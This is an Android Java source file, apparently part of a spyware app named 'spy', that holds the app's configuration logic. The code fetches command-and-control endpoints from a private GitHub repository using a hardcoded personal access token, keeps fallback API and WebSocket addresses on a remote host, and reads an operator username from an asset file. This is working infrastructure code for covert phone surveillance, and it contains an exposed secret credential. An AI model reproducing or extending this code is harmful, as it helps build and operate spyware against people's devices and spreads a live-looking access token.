package com.zaxz.spy;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Config {
    private static final String TAG = "SpyConfig";
    private static final String GITHUB_URL = "https://api.github.com/repos/xp-null/key/contents/spy.json";
    private static final String GITHUB_TOKEN = "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";
    
    public static String API_URL = "http://lexzymontokahkk.razzxhosting.my.id:2005";
    public static String WS_URL = "ws://lexzymontokahkk.razzxhosting.my.id:2005";
    
    public static void loadConfig(Context context) {
        try {
            SharedPreferences prefs = context.getSharedPreferences("spy_config", Context.MODE_PRIVATE);
            
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        URL url = new URL(GITHUB_URL);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("Authorization", "token " + GITHUB_TOKEN);
                        conn.setRequestProperty("Accept", "application/vnd.github.v3.raw");
                        conn.setConnectTimeout(5000);
                        conn.setReadTimeout(5000);
                        
                        int responseCode = conn.getResponseCode();
                        if (responseCode == 200) {
                            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                            StringBuilder response = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                response.append(line);
                            }
                            reader.close();
                            
                            JSONObject config = new JSONObject(response.toString());
                            
                            if (config.has("api_url")) {
                                API_URL = config.getString("api_url");
                            }
                            if (config.has("ws_url")) {
                                WS_URL = config.getString("ws_url");
                            }
                            
                            prefs.edit()
                                .putString("api_url", API_URL)
                                .putString("ws_url", WS_URL)
                                .apply();
                        }
                        conn.disconnect();
                    } catch (Exception e) {
                        API_URL = prefs.getString("api_url", "http://lexzymontokahkk.razzxhosting.my.id:2005");
                        WS_URL = prefs.getString("ws_url", "ws://lexzymontokahkk.razzxhosting.my.id:2005");
                    }
                }
            }).start();
        } catch (Exception e) {}
    }
    
    public static String getUsername(Context context) {
        try {
            InputStream is = context.getAssets().open("@zaxz_Zx");
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String username = reader.readLine();
            reader.close();
            is.close();
            return username != null ? username.trim() : "default";
        } catch (Exception e) {
            return "default";
        }
    }
}